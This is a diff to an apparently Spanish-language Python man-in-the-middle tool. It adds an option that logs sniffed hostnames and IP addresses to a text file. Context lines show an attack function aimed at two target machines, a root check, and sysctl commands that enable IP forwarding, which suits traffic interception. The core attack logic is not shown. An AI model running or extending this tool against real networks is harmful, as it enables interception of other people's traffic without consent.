@@ -23,6 +23,13 @@ logo = '''
 '''
 ejecutando = True
 
+def guardar(data):
+   try:
+      with open(f'{n_arch}.txt','a') as arch:
+         arch.write(f'\r\n{data}\r\n')
+   except Exception as e:
+      print(f'\n\033[0;40;31m[-] hubo un error durante el guardado de paquetes >> {e}\033[0m\n')
+      
 def ataque(ip1,ip2): 
    global ejecutando
   
@@ -57,9 +64,16 @@ def sniffing():
                #retorna la ip del destinatario
                p1 = informacion(func_sn[x])[0]
 
-               print(Fore.WHITE+f'\r\n[+] host > {gethostbyaddr(pqt)[0]}\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}\r\n')
+               info = f'[+] host > {gethostbyaddr(pqt)[0]}\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}'
 
-            except herror: print(Fore.WHITE+f'\r\n[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}\n\r')
+               print(Fore.WHITE+f'\r\n{info}\r\n')
+
+            except herror:
+               info = f'[+] ip numerica > {pqt}\n[+] ipv4 implicado > {p1}'
+               print(Fore.WHITE+f'\r\n{info}\n\r')
+            finally:
+               if guardado:
+                  guardar(data=info)
 
       except TypeError: pass
 
@@ -76,10 +90,17 @@ def ejecucion(maq1,maq2):
 
 if __name__ == '__main__':
    print(logo)
+   guardado = False
    if system() == 'Linux':
       if check_output('whoami',text=True).strip() == 'root': 
          maq1 = str(input(Fore.WHITE+'[#] maquina A (ipv4) >> ')).strip()
          maq2 = str(input(Fore.WHITE+'[#] maquina B (ipv4) >> ')).strip()
+         preg = str(input('[0] para guardar info en .txt >> '))
+
+         if preg == '0':
+            guardado = True
+            n_arch = str(input('[#] nombre que tendra el archivo >> '))
+
          print('\033[0m')
          for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
             'sysctl net.ipv4.ip_forward=1',
